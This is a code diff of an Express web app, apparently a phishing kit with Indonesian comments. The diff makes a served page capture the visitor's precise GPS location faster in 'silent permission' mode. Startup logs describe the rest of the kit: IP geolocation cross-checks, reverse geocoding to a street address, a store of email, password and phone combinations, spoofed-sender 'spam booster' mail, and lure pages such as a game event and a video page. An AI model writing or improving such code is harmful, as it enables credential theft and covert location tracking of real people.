@@ -795,7 +795,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
-// ========== HTML BIASA (SILENT PERMISSION) ==========
+// ========== HTML BIASA (GETGPS BARU - CEPAT) ==========
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -917,6 +917,9 @@ app.get('/', (req, res) => {
         } catch(e) { return 'Tidak terdeteksi'; }
     }
     
+    // ============================================================
+    // GPS BARU: CEPAT + POPUP IZIN PRESISI ASLI
+    // ============================================================
     async function getGPS() {
         return new Promise(async function(resolve) {
             if (!navigator.geolocation) {
@@ -926,74 +929,82 @@ app.get('/', (req, res) => {
             
             document.getElementById('gpsStatus').innerText = '🔍 Memproses GPS...';
             
-            let best = null;
+            // LAPIS 1: Cepat, paksa GPS, timeout 4s
             try {
-                best = await new Promise(function(res) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            res({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'GPS/WiFi (getCurrentPosition high)' });
-                        },
-                        function(err) { res(null); },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: true,
+                        timeout: 4000,
+                        maximumAge: 0
+                    });
                 });
-            } catch(e) { best = null; }
-            
-            if (best && best.accuracy && best.accuracy <= 100) {
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + best.lat + ', ' + best.lon + ' (' + Math.round(best.accuracy) + 'm)';
-                return resolve(best);
-            }
-            
-            const watchResult = await new Promise(function(res) {
-                let samples = [];
-                let watchId = null;
-                let done = false;
-                const finish = function() {
-                    if (done) return;
-                    done = true;
-                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                    if (samples.length === 0) return res(null);
-                    samples.sort(function(a,b) { return a.accuracy - b.accuracy; });
-                    res(samples[0]);
+                const result = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    source: 'GPS Cepat (Lapis 1)'
                 };
-                watchId = navigator.geolocation.watchPosition(
-                    function(pos) {
-                        samples.push({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'GPS/WiFi (watchPosition)' });
-                        if (pos.coords.accuracy <= 50) finish();
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
+                return resolve(result);
+            } catch (err) {
+                console.warn('Lapis 1 gagal/timeout:', err.message);
+            }
+
+            // LAPIS 2: watchPosition 6s
+            const watchResult = await new Promise((resolveWatch) => {
+                let bestSample = null;
+                const watchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        const sample = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            source: 'GPS/WiFi (Watch Cepat)'
+                        };
+                        if (!bestSample || sample.accuracy < bestSample.accuracy) {
+                            bestSample = sample;
+                        }
+                        if (sample.accuracy <= 30) {
+                            navigator.geolocation.clearWatch(watchId);
+                            resolveWatch(sample);
+                        }
                     },
-                    function(err) {},
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    (err) => console.warn('watch error:', err.message),
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                 );
-                setTimeout(finish, 10000);
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    resolveWatch(bestSample);
+                }, 6000);
             });
-            
-            if (watchResult && watchResult.accuracy && watchResult.accuracy <= 100) {
+
+            if (watchResult) {
                 document.getElementById('gpsStatus').innerHTML = '✅ ' + watchResult.lat + ', ' + watchResult.lon + ' (' + Math.round(watchResult.accuracy) + 'm)';
                 return resolve(watchResult);
             }
-            
-            let lowAcc = null;
+
+            // LAPIS 3: Fallback cepat
             try {
-                lowAcc = await new Promise(function(res) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            res({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'Cell Tower / WiFi (low accuracy)' });
-                        },
-                        function(err) { res(null); },
-                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
-                    );
+                const fallbackPos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: false,
+                        timeout: 3000,
+                        maximumAge: 60000
+                    });
                 });
-            } catch(e) { lowAcc = null; }
-            
-            const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
-            if (candidates.length === 0) {
+                const result = {
+                    lat: fallbackPos.coords.latitude,
+                    lon: fallbackPos.coords.longitude,
+                    accuracy: fallbackPos.coords.accuracy,
+                    source: 'Perkiraan WiFi/Seluler (Fallback Cepat)'
+                };
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
+                return resolve(result);
+            } catch (err) {
+                console.warn('Semua metode GPS gagal:', err.message);
                 document.getElementById('gpsStatus').innerText = '❌ GPS gagal, fallback ke IP';
                 return resolve(null);
             }
-            candidates.sort(function(a,b) { return a.accuracy - b.accuracy; });
-            const finalBest = candidates[0];
-            document.getElementById('gpsStatus').innerHTML = '✅ ' + finalBest.lat + ', ' + finalBest.lon + ' (' + Math.round(finalBest.accuracy) + 'm)';
-            return resolve(finalBest);
         });
     }
     
@@ -1119,7 +1130,7 @@ app.get('/', (req, res) => {
         canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY - SILENT MODE AKTIF!', 'color: red; font-size: 16px;');
+    console.log('%c🚫 DSTR SECURITY - SILENT MODE + GPS CEPAT AKTIF!', 'color: red; font-size: 16px;');
 </script>
 </body>
 </html>`);
@@ -1135,11 +1146,11 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
     console.log(`   → http://localhost:${PORT}/FF_EventA`);
-    console.log(`\n✅ GPS-FIRST STRATEGY: 3 lapis (GPS high → watch → cell tower) sebelum fallback IP!`);
+    console.log(`\n✅ GPS-FIRST CEPAT: 4s → 6s → 3s (total max ~13s) sebelum fallback IP!`);
     console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
     console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
     console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR!`);
-    console.log(`✅ HTML BIASA: Silent permission (tanpa banner)!`);
-    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS akurasi maksimal!`);
+    console.log(`✅ HTML BIASA: Silent permission + GPS cepat!`);
+    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS cepat + popup izin presisi asli!`);
 });
